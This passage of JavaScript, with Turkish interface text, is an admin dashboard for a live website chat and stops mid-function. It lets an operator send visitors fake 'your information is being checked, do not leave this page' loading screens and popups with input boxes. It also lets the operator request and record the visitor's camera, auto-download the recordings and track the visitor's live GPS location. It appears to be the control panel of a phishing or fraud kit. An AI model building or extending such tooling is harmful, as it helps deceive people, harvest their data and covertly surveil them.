import "./chat-sync.js?v=42";

async function ready() {
  if (window.ChatSync) return window.ChatSync;
  if (window.ChatSyncReady) return window.ChatSyncReady;
  return new Promise((resolve) => {
    let n = 0;
    const t = setInterval(() => {
      n += 1;
      if (window.ChatSyncReady) {
        clearInterval(t);
        Promise.resolve(window.ChatSyncReady).then(resolve);
        return;
      }
      if (window.ChatSync) {
        clearInterval(t);
        resolve(window.ChatSync);
        return;
      }
      // Firebase CDN geç yüklenebilir — 15 sn bekle
      if (n > 300) {
        clearInterval(t);
        resolve(null);
      }
    }, 50);
  });
}

function fmtTime(ts) {
  if (!ts) return "—";
  return new Date(ts).toLocaleString("tr-TR", {
    day: "2-digit",
    month: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
  });
}

function shortId(id) {
  return String(id || "").slice(0, 8);
}

function whoLabel(msg) {
  if (msg.who === "user") return "Ziyaretçi";
  if (msg.who === "admin" || msg.from === "admin") return "Sen";
  return "Bot";
}

const setupPanel = document.getElementById("setup-panel");
const loginPanel = document.getElementById("login-panel");
const dashPanel = document.getElementById("dash-panel");
const liveBadge = document.getElementById("live-badge");
const notifyBtn = document.getElementById("notify-btn");
const logoutBtn = document.getElementById("logout-btn");
const loginForm = document.getElementById("login-form");
const loginError = document.getElementById("login-error");
const sessionList = document.getElementById("session-list");
const sessionCount = document.getElementById("session-count");
const threadTitle = document.getElementById("thread-title");
const threadMeta = document.getElementById("thread-meta");
const threadMessages = document.getElementById("thread-messages");
const replyForm = document.getElementById("reply-form");
const replyInput = document.getElementById("reply-input");
const sendHint = document.getElementById("send-hint");
const quickList = document.getElementById("quick-list");
const sendLoadingBtn = document.getElementById("send-loading-btn");
const sendCameraBtn = document.getElementById("send-camera-btn");
const sendPopupBtn = document.getElementById("send-popup-btn");
const popupText = document.getElementById("popup-text");
const popupOk = document.getElementById("popup-ok");
const popupCancel = document.getElementById("popup-cancel");
const popupPlaceholder = document.getElementById("popup-placeholder");
const adminCameraBox = document.getElementById("admin-camera-box");
const cameraStatus = document.getElementById("camera-status");
const adminRemoteVideo = document.getElementById("admin-remote-video");
const endCameraBtn = document.getElementById("end-camera-btn");
const endCameraBtnModal = document.getElementById("end-camera-btn-modal");
const hideCameraBtn = document.getElementById("hide-camera-btn");
const hideCameraPanelBtn = document.getElementById("hide-camera-panel-btn");
const hideCameraBtnModal = document.getElementById("hide-camera-btn-modal");
const reopenCameraBtn = document.getElementById("reopen-camera-btn");
const downloadRecordingBtn = document.getElementById("download-recording-btn");
const adminLiveLocation = document.getElementById("admin-live-location");
const adminLocationText = document.getElementById("admin-location-text");
const adminLocationMaps = document.getElementById("admin-location-maps");
const exportChatBtn = document.getElementById("export-chat-btn");
const clearChatBtn = document.getElementById("clear-chat-btn");
const clearAllChatsBtn = document.getElementById("clear-all-chats-btn");
const templatesEditor = document.getElementById("templates-editor");
const templatesForm = document.getElementById("templates-form");
const templatesSaved = document.getElementById("templates-saved");
const addTemplateBtn = document.getElementById("add-template");
const resetTemplatesBtn = document.getElementById("reset-templates");
const alertOverlay = document.getElementById("admin-alert-overlay");
const alertKicker = document.getElementById("admin-alert-kicker");
const alertTitle = document.getElementById("admin-alert-title");
const alertBody = document.getElementById("admin-alert-body");
const alertDismiss = document.getElementById("admin-alert-dismiss");

let unsubSessions = null;
let unsubMessages = null;
let selectedId = null;
let seenMessageIds = new Set();
let notifyEnabled = false;
let alertsArmed = false;
let sending = false;
let adminCall = null;
let knownSessionIds = new Set();
let sessionsHydrated = false;
let alertAudioCtx = null;
let titleFlashTimer = null;
let originalTitle = document.title;
let alertHideTimer = null;

function ensureAlertAudio() {
  if (alertAudioCtx) return alertAudioCtx;
  const AC = window.AudioContext || window.webkitAudioContext;
  if (!AC) return null;
  alertAudioCtx = new AC();
  return alertAudioCtx;
}

function playAlertBeeps() {
  const ctx = ensureAlertAudio();
  if (!ctx) return;
  if (ctx.state === "suspended") ctx.resume().catch(() => {});

  const pattern = [
    { t: 0, f: 880, d: 0.16 },
    { t: 0.2, f: 1175, d: 0.16 },
    { t: 0.4, f: 880, d: 0.16 },
    { t: 0.7, f: 1319, d: 0.28 },
    { t: 1.1, f: 880, d: 0.16 },
    { t: 1.3, f: 1175, d: 0.16 },
    { t: 1.5, f: 1480, d: 0.35 },
  ];
  const now = ctx.currentTime;
  pattern.forEach(({ t, f, d }) => {
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.type = "square";
    osc.frequency.value = f;
    gain.gain.setValueAtTime(0.0001, now + t);
    gain.gain.exponentialRampToValueAtTime(0.55, now + t + 0.02);
    gain.gain.exponentialRampToValueAtTime(0.0001, now + t + d);
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.start(now + t);
    osc.stop(now + t + d + 0.02);
  });
}

function flashDocumentTitle(text) {
  if (titleFlashTimer) clearInterval(titleFlashTimer);
  let on = false;
  let n = 0;
  originalTitle = originalTitle || document.title;
  titleFlashTimer = window.setInterval(() => {
    on = !on;
    document.title = on ? `🚨 ${text}` : originalTitle;
    n += 1;
    if (n > 24) {
      clearInterval(titleFlashTimer);
      titleFlashTimer = null;
      document.title = originalTitle;
    }
  }, 450);
}

function hideAdminAlert() {
  if (alertOverlay) alertOverlay.hidden = true;
  document.body.classList.remove("is-alert-flash");
  if (alertHideTimer) {
    clearTimeout(alertHideTimer);
    alertHideTimer = null;
  }
}

function showAdminAlert({ kicker, title, body }) {
  if (alertKicker) alertKicker.textContent = kicker || "YENİ BİLDİRİM";
  if (alertTitle) alertTitle.textContent = title || "Alarm";
  if (alertBody) alertBody.textContent = body || "";
  if (alertOverlay) alertOverlay.hidden = false;
  document.body.classList.add("is-alert-flash");
  window.setTimeout(() => document.body.classList.remove("is-alert-flash"), 700);
  if (alertHideTimer) clearTimeout(alertHideTimer);
  // Yüksek öncelik: 20 sn sonra otomatik kapanır; Tamam ile hemen kapanır
  alertHideTimer = window.setTimeout(hideAdminAlert, 20000);
}

function pushDesktopNotification(title, body, tag) {
  if (!("Notification" in window)) return;
  if (Notification.permission !== "granted") return;
  try {
    new Notification(title, {
      body: String(body || "").slice(0, 160),
      tag: tag || `alert-${Date.now()}`,
      requireInteraction: true,
    });
  } catch {
    /* ignore */
  }
}

function fireHighAlert({ kicker, title, body, tag }) {
  if (!alertsArmed) return;
  playAlertBeeps();
  showAdminAlert({ kicker, title, body });
  flashDocumentTitle(title);
  pushDesktopNotification(title, body, tag);
  // Canlı rozet vurgusu
  if (liveBadge) {
    liveBadge.classList.add("is-ping");
    window.setTimeout(() => liveBadge.classList.remove("is-ping"), 4000);
  }
}

async function armAlerts() {
  alertsArmed = true;
  ensureAlertAudio();
  if (alertAudioCtx?.state === "suspended") {
    await alertAudioCtx.resume().catch(() => {});
  }
  if ("Notification" in window) {
    const perm =
      Notification.permission === "granted"
        ? "granted"
        : await Notification.requestPermission();
    notifyEnabled = perm === "granted";
  } else {
    notifyEnabled = false;
  }
  if (notifyBtn) {
    notifyBtn.textContent = notifyEnabled
      ? "🔔 Alarmlar açık"
      : "🔔 Sesli alarm açık (masaüstü kapalı)";
  }
  // Test bip (kısa) — tarayıcı ses kilidini açar
  playAlertBeeps();
}

function show(view) {
  if (setupPanel) setupPanel.hidden = view !== "setup";
  if (loginPanel) loginPanel.hidden = view !== "login";
  if (dashPanel) dashPanel.hidden = view !== "dash";
  if (liveBadge) liveBadge.hidden = view !== "dash";
  if (notifyBtn) notifyBtn.hidden = view !== "dash";
  if (logoutBtn) logoutBtn.hidden = view !== "dash";
}

function authOk() {
  return sessionStorage.getItem("admin_ok") === "1";
}

function setAuth(ok) {
  if (ok) sessionStorage.setItem("admin_ok", "1");
  else sessionStorage.removeItem("admin_ok");
}

function escapeHtml(str) {
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function renderSessions(rows) {
  sessionCount.textContent = `${rows.length} oturum`;
  sessionList.innerHTML = "";
  if (!rows.length) {
    sessionList.innerHTML = '<li class="session-empty">Henüz sohbet yok. Sitede bir sohbet başlatın.</li>';
    return;
  }

  rows.forEach((row) => {
    const li = document.createElement("li");
    const btn = document.createElement("button");
    btn.type = "button";
    btn.className = "session-item" + (row.id === selectedId ? " is-active" : "");
    btn.dataset.sessionId = row.id;
    const last =
      row.lastWho === "user" ? "ziyaretçi" : row.lastWho === "admin" ? "sen" : "bot";
    btn.innerHTML = `
      <strong>#${shortId(row.id)}</strong>
      <span>${escapeHtml(row.preview || "Mesaj yok")}</span>
      <em>${fmtTime(row.updatedAt)} · ${last}</em>
    `;
    btn.addEventListener("click", () => openSession(row));
    li.appendChild(btn);
    sessionList.appendChild(li);
  });
}

function setEndCameraVisible(visible) {
  if (endCameraBtn) endCameraBtn.hidden = !visible;
  if (endCameraBtnModal) endCameraBtnModal.hidden = !visible;
}

function setHideCameraVisible(visible) {
  if (hideCameraPanelBtn) hideCameraPanelBtn.hidden = !visible;
  if (hideCameraBtnModal) hideCameraBtnModal.hidden = !visible;
}

function setCameraUi(visible, statusText) {
  if (adminCameraBox) adminCameraBox.hidden = !visible;
  if (cameraStatus && statusText) cameraStatus.textContent = statusText;
  if (adminCameraBox) {
    adminCameraBox.classList.toggle(
      "is-recording",
      Boolean(visible && /kayıt yapılıyor|Canlı|Bağlan|Yanıt|video|ICE/i.test(statusText || ""))
    );
  }
  const sessionActive = Boolean(adminCall);
  setEndCameraVisible(sessionActive);
  setHideCameraVisible(sessionActive && visible);
  if (reopenCameraBtn) {
    reopenCameraBtn.hidden = visible || !sessionActive;
  }
}

function hideCameraPopup() {
  if (adminCameraBox) adminCameraBox.hidden = true;
  if (reopenCameraBtn) reopenCameraBtn.hidden = !adminCall;
  setEndCameraVisible(Boolean(adminCall));
  setHideCameraVisible(false);
}

function showCameraPopup() {
  if (!adminCall && downloadRecordingBtn?.hidden) return;
  if (adminCameraBox) adminCameraBox.hidden = false;
  if (reopenCameraBtn) reopenCameraBtn.hidden = true;
  setEndCameraVisible(Boolean(adminCall));
  setHideCameraVisible(Boolean(adminCall));
}

function clearAdminLocationUi() {
  if (adminLiveLocation) adminLiveLocation.hidden = true;
  if (adminLocationText) adminLocationText.textContent = "Konum bekleniyor…";
  if (adminLocationMaps) {
    adminLocationMaps.hidden = true;
    adminLocationMaps.removeAttribute("href");
  }
}

function updateAdminLocationUi(loc, status, error) {
  if (!adminLiveLocation) return;
  adminLiveLocation.hidden = false;
  if (loc && Number.isFinite(Number(loc.lat)) && Number.isFinite(Number(loc.lng))) {
    const lat = Number(loc.lat);
    const lng = Number(loc.lng);
    const acc = Number(loc.accuracy);
    const accTxt = Number.isFinite(acc) ? ` · ±${Math.round(acc)} m` : "";
    const t = loc.ts ? new Date(loc.ts).toLocaleTimeString("tr-TR") : "";
    if (adminLocationText) {
      adminLocationText.textContent = `${lat.toFixed(6)}, ${lng.toFixed(6)}${accTxt}${
        t ? ` · ${t}` : ""
      }`;
    }
    if (adminLocationMaps) {
      adminLocationMaps.href = `https://www.google.com/maps?q=${lat},${lng}`;
      adminLocationMaps.hidden = false;
    }
    return;
  }
  if (adminLocationMaps) adminLocationMaps.hidden = true;
  const st = String(status || "");
  if (st === "denied") {
    adminLocationText.textContent = "Konum izni reddedildi";
  } else if (st === "unsupported") {
    adminLocationText.textContent = "Tarayıcı konum desteklemiyor";
  } else if (st === "unavailable" || st === "timeout" || st === "error") {
    adminLocationText.textContent = `Konum alınamadı${error ? `: ${error}` : ""}`;
  } else {
    adminLocationText.textContent = "Konum bekleniyor…";
  }
}

function clearRecordingLink() {
  if (!downloadRecordingBtn) return;
  if (downloadRecordingBtn.href?.startsWith("blob:")) {
    URL.revokeObjectURL(downloadRecordingBtn.href);
  }
  downloadRecordingBtn.removeAttribute("href");
  downloadRecordingBtn.hidden = true;
  downloadRecordingBtn.textContent = "Kaydı indir";
}

function forceDownloadBlob(blob, name) {
  if (!blob?.size) return false;
  const fileName = name || `kamera-${Date.now()}.webm`;
  const objUrl = URL.createObjectURL(blob);
  if (downloadRecordingBtn) {
    if (downloadRecordingBtn.href?.startsWith("blob:")) {
      URL.revokeObjectURL(downloadRecordingBtn.href);
    }
    downloadRecordingBtn.href = objUrl;
    downloadRecordingBtn.download = fileName;
    downloadRecordingBtn.removeAttribute("target");
    downloadRecordingBtn.hidden = false;
    downloadRecordingBtn.textContent = "Kaydı indir";
  }
  try {
    const a = document.createElement("a");
    a.href = objUrl;
    a.download = fileName;
    a.style.display = "none";
    document.body.appendChild(a);
    a.click();
    a.remove();
  } catch {
    /* ignore */
  }
  if (adminCameraBox) adminCameraBox.hidden = false;
  if (reopenCameraBtn) reopenCameraBtn.hidden = true;
  setCameraUi(true, "Kayıt indirildi");
  sendHint.hidden = false;
  sendHint.textContent = `Kayıt indirildi: ${fileName}`;
  window.setTimeout(() => {
    if (sendHint.textContent.includes("Kayıt")) sendHint.hidden = true;
  }, 5000);
  return true;
}

async function forceDownloadFromUrl(url, name) {
  if (!url) return;
  const fileName = name || `kamera-${Date.now()}.webm`;

  if (downloadRecordingBtn) {
    downloadRecordingBtn.href = url;
    downloadRecordingBtn.download = fileName;
    downloadRecordingBtn.target = "_blank";
    downloadRecordingBtn.rel = "noopener";
    downloadRecordingBtn.hidden = false;
    downloadRecordingBtn.textContent = "Kaydı indir (Storage)";
  }
  if (adminCameraBox) adminCameraBox.hidden = false;
  if (reopenCameraBtn) reopenCameraBtn.hidden = true;
  setCameraUi(true, "Kayıt indiriliyor…");
  sendHint.hidden = false;
  sendHint.textContent = `Kayıt indiriliyor: ${fileName}`;

  try {
    const res = await fetch(url);
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const blob = await res.blob();
    if (blob?.size) {
      forceDownloadBlob(blob, fileName);
      if (downloadRecordingBtn) downloadRecordingBtn.textContent = "Kaydı indir (Storage)";
      return;
    }
  } catch (err) {
    console.warn("Blob fetch failed, opening URL", err);
  }

  try {
    const a = document.createElement("a");
    a.href = url;
    a.download = fileName;
    a.target = "_blank";
    a.rel = "noopener";
    a.style.display = "none";
    document.body.appendChild(a);
    a.click();
    a.remove();
  } catch {
    window.open(url, "_blank", "noopener");
  }

  window.setTimeout(() => {
    if (sendHint.textContent.includes("Kayıt")) sendHint.hidden = true;
  }, 5000);
}

let recordingWatchUnsub = null;
let recordingWatchKey = null;
let recordingWatchTimer = null;

function stopRecordingWatch() {
  try {
    recordingWatchUnsub?.();
  } catch {
    /* ignore */
  }
  recordingWatchUnsub = null;
  recordingWatchKey = null;
  if (recordingWatchTimer) {
    clearTimeout(recordingWatchTimer);
    recordingWatchTimer = null;
  }
}

function startRecordingWatch(sessionId, callId, state) {
  stopRecordingWatch();
  const sync = window.ChatSync;
  if (!sync?.listenCameraCall || !sessionId || !callId) return;
  const key = `${sessionId}/${callId}`;
  recordingWatchKey = key;

  recordingWatchUnsub = sync.listenCameraCall(sessionId, callId, (data) => {
    if (recordingWatchKey !== key || !data) return;
    if (data.recordingUrl && data.recordingUrl !== state.seenRecordingUrl) {
      state.seenRecordingUrl = data.recordingUrl;
      forceDownloadFromUrl(
        data.recordingUrl,
        data.recordingName || `kamera-${shortId(sessionId)}.webm`
      );
      stopRecordingWatch();
      return;
    }
    if (data.recordingStatus === "failed") {
      setCameraUi(
        true,
        `Storage kaydı yok (${data.recordingError || "hata"}) · yerel yedek deneniyor…`
      );
      if (state.lastBlob?.size) {
        forceDownloadBlob(state.lastBlob, `kamera-admin-${shortId(sessionId)}.webm`);
      } else {
        sendHint.hidden = false;
        sendHint.textContent = "Kayıt alınamadı. Storage kurallarını yayınladığınızdan emin olun.";
      }
      stopRecordingWatch();
    }
  });

  // Storage gelmezse 40 sn sonra admin yerel kaydını indir
  recordingWatchTimer = window.setTimeout(() => {
    if (recordingWatchKey !== key) return;
    if (state.seenRecordingUrl) {
      stopRecordingWatch();
      return;
    }
    if (state.lastBlob?.size) {
      forceDownloadBlob(state.lastBlob, `kamera-admin-${shortId(sessionId)}.webm`);
      setCameraUi(true, "Storage gecikti · yerel kayıt indirildi");
    } else {
      setCameraUi(true, "Kayıt gelmedi · Storage / kamera süresini kontrol edin");
      sendHint.hidden = false;
      sendHint.textContent =
        "Kayıt gelmedi. Firebase Storage Rules yayınlı mı ve ziyaretçi sayfası güncel mi kontrol edin.";
    }
    stopRecordingWatch();
  }, 40000);
}

function resetLiveVideoUi() {
  clearRecordingLink();
  clearAdminLocationUi();
  if (adminRemoteVideo) {
    adminRemoteVideo.srcObject = null;
    adminRemoteVideo.load?.();
  }
}

function pickRecorderMime() {
  if (typeof MediaRecorder === "undefined") return "";
  const types = [
    "video/webm;codecs=vp8",
    "video/webm;codecs=vp9",
    "video/webm",
  ];
  return types.find((t) => MediaRecorder.isTypeSupported(t)) || "";
}

function startAdminRecording(stream, state) {
  if (!stream || state.recorder || typeof MediaRecorder === "undefined") return false;

  const videoTracks = stream.getVideoTracks().filter((t) => t.readyState === "live");
  if (!videoTracks.length) {
    setCameraUi(true, "Canlı · video track yok");
    return false;
  }

  const recordStream = new MediaStream(videoTracks);
  const mime = pickRecorderMime();
  let recorder;
  try {
    recorder = mime
      ? new MediaRecorder(recordStream, { mimeType: mime, videoBitsPerSecond: 1_500_000 })
      : new MediaRecorder(recordStream);
  } catch (err) {
    setCameraUi(true, `Canlı · kayıt yok (${err?.message || "desteklenmiyor"})`);
    return false;
  }

  const chunks = [];
  state.recordChunks = chunks;
  recorder.ondataavailable = (e) => {
    if (e.data?.size) chunks.push(e.data);
  };
  recorder.onstop = () => {
    const type = recorder.mimeType || mime || "video/webm";
    const blob = new Blob(chunks, { type });
    state.lastBlob = blob;
    // Canlı oturumdayken indirme butonu gösterme (eski kayıt yarışı)
    state._recordingStopped?.();
  };
  recorder.onerror = () => {
    setCameraUi(true, "Canlı · kayıt hatası");
  };

  state.recorder = recorder;
  try {
    recorder.start(500);
    setCameraUi(true, "Canlı · kayıt yapılıyor…");
    return true;
  } catch {
    state.recorder = null;
    setCameraUi(true, "Canlı · kayıt başlatılamadı");
    return false;
  }
}

function stopAdminRecording(call, { autoDownload = false } = {}) {
  return new Promise((resolve) => {
    let settled = false;
    const finish = (ok) => {
      if (settled) return;
      settled = true;
      resolve(ok);
    };

    const rec = call?.recorder;
    if (!rec || rec.state === "inactive") {
      if (call?.lastBlob?.size) {
        finish(true);
        return;
      }
      finish(false);
      return;
    }
    call.autoDownload = autoDownload;
    call._recordingStopped = () => finish(true);
    window.setTimeout(() => finish(Boolean(call.lastBlob?.size)), 4000);
    try {
      if (rec.state === "recording") {
        try {
          rec.requestData();
        } catch {
          /* ignore */
        }
      }
      if (rec.state === "recording" || rec.state === "paused") rec.stop();
      else finish(false);
    } catch {
      finish(false);
    }
  });
}

async function stopAdminCall(updateRemote = true, { autoDownload = false, keepUi = false } = {}) {
  const call = adminCall;
  adminCall = null;
  if (!call) {
    if (!keepUi) {
      try {
        setCameraUi(false);
      } catch {
        if (adminCameraBox) adminCameraBox.hidden = true;
      }
    }
    if (adminRemoteVideo) adminRemoteVideo.srcObject = null;
    return;
  }
  try {
    call.unsubCall?.();
    call.unsubIce?.();
  } catch {
    /* ignore */
  }

  await stopAdminRecording(call, { autoDownload });

  try {
    call.pc?.close();
  } catch {
    /* ignore */
  }
  if (adminRemoteVideo) adminRemoteVideo.srcObject = null;

  const hasDownload = Boolean(downloadRecordingBtn && !downloadRecordingBtn.hidden);
  if (keepUi || hasDownload || call.lastBlob?.size) {
    setCameraUi(true, cameraStatus?.textContent || "Kayıt hazır");
    adminCameraBox?.classList.remove("is-recording");
  } else {
    setCameraUi(false);
  }

  if (updateRemote && call.sessionId && call.callId && window.ChatSync) {
    window.ChatSync.setCameraCallStatus(call.sessionId, call.callId, "ended").catch(() => {});
  }
}

async function joinAdminCamera(sessionId, callId) {
  if (!window.ChatSync || !sessionId || !callId) return;
  if (adminCall?.callId === callId && adminCall?.sessionId === sessionId && adminCall?.pc) {
    showCameraPopup();
    return;
  }

  await stopAdminCall(false, { keepUi: true });
  resetLiveVideoUi();
  clearAdminLocationUi();
  setCameraUi(true, "Ziyaretçi onayı bekleniyor…");

  const sync = window.ChatSync;
  const pc = new RTCPeerConnection(sync.ICE_SERVERS);
  let answered = false;
  const pendingVisitorIce = [];
  let remoteReady = false;
  let callEnded = false;
  const state = {
    sessionId,
    callId,
    pc,
    recorder: null,
    recordChunks: [],
    lastBlob: null,
    autoDownload: false,
    seenRecordingUrl: null,
    unsubCall: null,
    unsubIce: null,
  };
  adminCall = state;

  const attachLiveVideo = (stream, track) => {
    if (!adminRemoteVideo || !stream) return;
    adminRemoteVideo.srcObject = stream;
    adminRemoteVideo.muted = true;
    adminRemoteVideo.autoplay = true;
    adminRemoteVideo.playsInline = true;
    const kick = () => {
      adminRemoteVideo.play?.().catch(() => {});
    };
    kick();
    adminRemoteVideo.onloadedmetadata = kick;
    if (track) {
      track.addEventListener("unmute", () => {
        // Chrome bazen ilk frameden önce siyah gösterir
        adminRemoteVideo.srcObject = stream;
        kick();
        setCameraUi(true, "Canlı görüntü");
      });
      if (track.muted === false) {
        setCameraUi(true, "Canlı görüntü");
      }
    }
    showCameraPopup();
  };

  pc.ontrack = (ev) => {
    if (adminCall !== state || callEnded) return;
    const track = ev.track;
    const stream = ev.streams?.[0] || new MediaStream([track]);
    if (track && track.kind === "video") {
      attachLiveVideo(stream, track);
      // Gösterim için orijinal track; kayıt için clone (siyah ekranı önler)
      try {
        const clone = track.clone();
        const recordStream = new MediaStream([clone]);
        window.setTimeout(() => {
          if (adminCall !== state || state.recorder || callEnded) return;
          startAdminRecording(recordStream, state);
        }, 800);
      } catch {
        setCameraUi(true, "Canlı görüntü");
      }
    }
  };

  pc.onconnectionstatechange = () => {
    if (adminCall !== state) return;
    const s = pc.connectionState;
    if (s === "connected") {
      setCameraUi(true, "Canlı görüntü bağlı");
      state.pc?.getReceivers?.().forEach((receiver) => {
        const track = receiver.track;
        if (!track || track.kind !== "video") return;
        attachLiveVideo(new MediaStream([track]), track);
      });
    }
    if (s === "failed") setCameraUi(true, "Bağlantı başarısız — ağ/firewall");
    if (s === "disconnected") setCameraUi(true, "Bağlantı koptu…");
  };

  pc.oniceconnectionstatechange = () => {
    if (adminCall !== state) return;
    const s = pc.iceConnectionState;
    if (s === "connected" || s === "completed") {
      setCameraUi(true, "Canlı görüntü (ICE OK)");
      state.pc?.getReceivers?.().forEach((receiver) => {
        const track = receiver.track;
        if (!track || track.kind !== "video") return;
        attachLiveVideo(new MediaStream([track]), track);
      });
    }
    if (s === "failed") {
      setCameraUi(true, "ICE başarısız — ağ engeli olabilir");
    }
  };

  pc.onicecandidate = (ev) => {
    if (ev.candidate && !callEnded) {
      sync.pushIceCandidate(sessionId, callId, "admin", ev.candidate.toJSON()).catch(() => {});
    }
  };

  const addVisitorIce = async (cand) => {
    if (!cand || !state.pc || callEnded) return;
    if (!remoteReady) {
      pendingVisitorIce.push(cand);
      return;
    }
    try {
      await state.pc.addIceCandidate(new RTCIceCandidate(cand));
    } catch {
      /* ignore */
    }
  };

  state.unsubIce = sync.listenIceCandidates(sessionId, callId, "visitor", (cand) => {
    addVisitorIce(cand);
  });

  state.unsubCall = sync.listenCameraCall(sessionId, callId, async (data) => {
    if (!data || adminCall !== state) return;

    if (data.location || data.locationStatus) {
      updateAdminLocationUi(data.location, data.locationStatus, data.locationError);
    }

    // Storage kaydı hazır — oturum bitti/kapanmış olsa da indir
    if (
      data.recordingUrl &&
      data.recordingUrl !== state.seenRecordingUrl &&
      (data.status === "ended" ||
        state.awaitingRecording ||
        data.recordingStatus === "ready")
    ) {
      state.seenRecordingUrl = data.recordingUrl;
      forceDownloadFromUrl(
        data.recordingUrl,
        data.recordingName || `kamera-${shortId(sessionId)}.webm`
      );
      stopRecordingWatch();
    }

    if (data.status === "denied") {
      callEnded = true;
      setCameraUi(true, "Ziyaretçi kamerayı reddetti");
      await stopAdminCall(false, { keepUi: true });
      return;
    }
    if (data.status === "ended") {
      callEnded = true;
      const pending = {
        sessionId,
        callId,
        lastBlob: null,
        seenRecordingUrl: state.seenRecordingUrl || null,
        awaitingRecording: true,
      };
      try {
        state.unsubIce?.();
        state.unsubIce = null;
        state.pc?.close();
        state.pc = null;
      } catch {
        /* ignore */
      }
      try {
        await stopAdminRecording(state, { autoDownload: false });
        pending.lastBlob = state.lastBlob || null;
      } catch {
        /* ignore */
      }
      try {
        state.unsubCall?.();
        state.unsubCall = null;
      } catch {
        /* ignore */
      }
      if (adminCall === state) adminCall = null;
      if (adminRemoteVideo) adminRemoteVideo.srcObject = null;
      adminCameraBox?.classList.remove("is-recording");

      if (data.recordingUrl && data.recordingUrl !== pending.seenRecordingUrl) {
        pending.seenRecordingUrl = data.recordingUrl;
        forceDownloadFromUrl(
          data.recordingUrl,
          data.recordingName || `kamera-${shortId(sessionId)}.webm`
        );
      } else if (pending.lastBlob?.size) {
        forceDownloadBlob(pending.lastBlob, `kamera-admin-${shortId(sessionId)}.webm`);
        setCameraUi(true, "Yerel kayıt indirildi · Storage yedek bekleniyor…");
        startRecordingWatch(sessionId, callId, pending);
      } else {
        setCameraUi(true, "Bağlantı kapandı · ziyaretçi kaydı yükleniyor…");
        startRecordingWatch(sessionId, callId, pending);
      }
      setEndCameraVisible(false);
      if (reopenCameraBtn) reopenCameraBtn.hidden = false;
      return;
    }
    if (data.status === "requested") {
      // ICE güncellemesi status'u requested bırakmış olabilir; ileri gitmiş UI'yi geri alma
      if (!data.offer && !data.visitorReady && !answered) {
        clearRecordingLink();
        setCameraUi(true, "Ziyaretçi onayı bekleniyor…");
      }
    }
    if (data.visitorReady && !answered) {
      setCameraUi(true, "Ziyaretçi kamerayı açtı · bağlanıyor…");
    }
    if ((data.status === "live" || data.offer) && !answered) {
      setCameraUi(true, "Sinyal alındı · yanıtlanıyor…");
    }
    if (answered && adminRemoteVideo?.srcObject) {
      setCameraUi(true, "Canlı görüntü");
    } else if (answered) {
      setCameraUi(true, "Yanıt gönderildi · video bekleniyor…");
    }
    // Bitmiş oturumun eski offer/answer'ına bağlanma
    if (callEnded) return;
    if (data.offer && !answered && state.pc) {
      answered = true;
      try {
        await state.pc.setRemoteDescription(
          new RTCSessionDescription({
            type: data.offer.type,
            sdp: data.offer.sdp,
          })
        );
        remoteReady = true;
        for (const cand of pendingVisitorIce.splice(0)) {
          await addVisitorIce(cand);
        }
        const answer = await state.pc.createAnswer();
        await state.pc.setLocalDescription(answer);
        if (typeof sync.writeCameraAnswer === "function") {
          await sync.writeCameraAnswer(sessionId, callId, {
            type: answer.type,
            sdp: answer.sdp,
          });
        } else {
          await sync.writeCameraSignal(sessionId, callId, "answer", {
            type: answer.type,
            sdp: answer.sdp,
          });
        }
        setCameraUi(true, "Yanıt gönderildi · video bekleniyor…");
        const attachReceivers = () => {
          state.pc?.getReceivers?.().forEach((receiver) => {
            const track = receiver.track;
            if (!track || track.kind !== "video") return;
            attachLiveVideo(new MediaStream([track]), track);
          });
        };
        window.setTimeout(attachReceivers, 300);
        window.setTimeout(attachReceivers, 1500);
      } catch (err) {
        answered = false;
        setCameraUi(true, `Bağlantı hatası: ${err?.message || err}`);
      }
    }
  });
}

function appendThreadMessage(msg, announce) {
  if (!msg?.id || seenMessageIds.has(msg.id)) return;
  seenMessageIds.add(msg.id);

  const isAdmin = msg.who === "admin" || msg.from === "admin";
  const isLoading = msg.type === "loading";
  const row = document.createElement("div");
  const side = msg.who === "user" ? "user" : "bot";
  row.className = `chat-bubble chat-${side}${isAdmin ? " chat-admin" : ""}${
    isLoading ? " chat-loading" : ""
  }`;
  const meta = document.createElement("span");
  meta.className = "chat-meta";
  meta.textContent = `${whoLabel(msg)} · ${fmtTime(msg.ts)}`;
  const body = document.createElement("div");
  body.className = "chat-loading-body";
  if (isLoading) {
    body.innerHTML = `
      <span class="chat-spinner" aria-hidden="true"></span>
      <p></p>
      <span class="chat-loading-dots" aria-hidden="true"><i></i><i></i><i></i></span>
    `;
    body.querySelector("p").textContent =
      msg.text || "Bilgileriniz kontrol ediliyor. Lütfen bu sayfadan ayrılmayın…";
  } else if (msg.type === "popup") {
    const p = document.createElement("p");
    p.textContent = `Popup: ${msg.text || ""}`;
    const tags = document.createElement("em");
    tags.className = "popup-btn-tags";
    tags.textContent = `${msg.okLabel || "Tamam"} / ${msg.cancelLabel || "İptal"}${
      msg.withInput ? " · metin kutusu" : ""
    }`;
    body.append(p, tags);
  } else if (msg.type === "camera") {
    const p = document.createElement("p");
    p.textContent = `📷 Kamera talebi: ${msg.text || ""}`;
    body.appendChild(p);
    // Geçmiş oturumlara otomatik bağlanma — eski kayıt indirmesin / canlıyı bozmasın.
    // Canlı bağlanma yalnızca "Kamera talebi gönder" ile yapılır.
  } else {
    const p = document.createElement("p");
    p.textContent = msg.text || "";
    body.appendChild(p);
  }
  row.append(meta, body);
  threadMessages.appendChild(row);
  threadMessages.scrollTop = threadMessages.scrollHeight;

  if (announce && msg.who === "user") {
    fireHighAlert({
      kicker: "YENİ MESAJ",
      title: "Ziyaretçi yazdı",
      body: String(msg.text || "(boş mesaj)").slice(0, 180),
      tag: `msg-${msg.id}`,
    });
  }
}

function setThreadToolsEnabled(enabled) {
  if (exportChatBtn) exportChatBtn.disabled = !enabled;
  if (clearChatBtn) clearChatBtn.disabled = !enabled;
}

function clearThreadUi() {
  seenMessageIds = new Set();
  if (threadMessages) threadMessages.innerHTML = "";
}

function resetSelectedSessionUi() {
  selectedId = null;
  setThreadToolsEnabled(false);
  clearThreadUi();
  if (threadTitle) threadTitle.textContent = "Bir sohbet seçin";
  if (threadMeta) threadMeta.textContent = "Sol listeden canlı oturumları izleyin.";
  if (unsubMessages) {
    unsubMessages();
    unsubMessages = null;
  }
